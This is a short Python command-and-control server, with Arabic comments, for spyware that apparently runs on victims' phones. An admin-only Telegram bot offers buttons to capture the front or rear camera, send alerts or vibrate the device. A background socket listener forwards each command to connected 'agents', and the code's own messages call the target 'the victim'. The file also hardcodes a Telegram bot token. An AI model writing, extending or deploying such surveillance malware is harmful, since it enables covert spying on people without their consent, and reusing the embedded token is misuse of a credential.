import logging
import socket
import threading
import os
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- الإعدادات السيادية ---
TOKEN = "7745042123:AAHERMo9DzTcxSQ7ZtQgF_faQAnD6BngDRw"
ADMIN_ID = 6654753506  # ضع معرفك هنا
BIND_PORT = 10000     # يفضل استخدام 10000 على Render
AGENT_SOCKET = None

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    keyboard = [
        [InlineKeyboardButton("📸 كاميرا أمامية", callback_data='cam_1'),
         InlineKeyboardButton("📸 كاميرا خلفية", callback_data='cam_0')],
        [InlineKeyboardButton("🔔 إرسال إشعار", callback_data='alert'),
         InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('⚙️ تم تحديث النظام لنسخة 2026. اختر أمراً:', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global AGENT_SOCKET
    query = update.callback_query
    await query.answer()
    
    if not AGENT_SOCKET:
        await query.edit_message_text("⚠️ لا يوجد اتصال نشط من الضحية حالياً.")
        return

    cmd = query.data
    AGENT_SOCKET.send(cmd.encode())
    await query.edit_message_text(f"🚀 تم إرسال الأمر: {cmd}")

def socket_server():
    global AGENT_SOCKET
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', BIND_PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        AGENT_SOCKET = conn
        print(f"[!] New Agent Connected: {addr}")

def main():
    # تشغيل السوكيت في الخلفية
    threading.Thread(target=socket_server, daemon=True).start()
    
    # بناء البوت بنظام الإصدار الجديد
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    application.run_polling()

if __name__ == '__main__':
    main()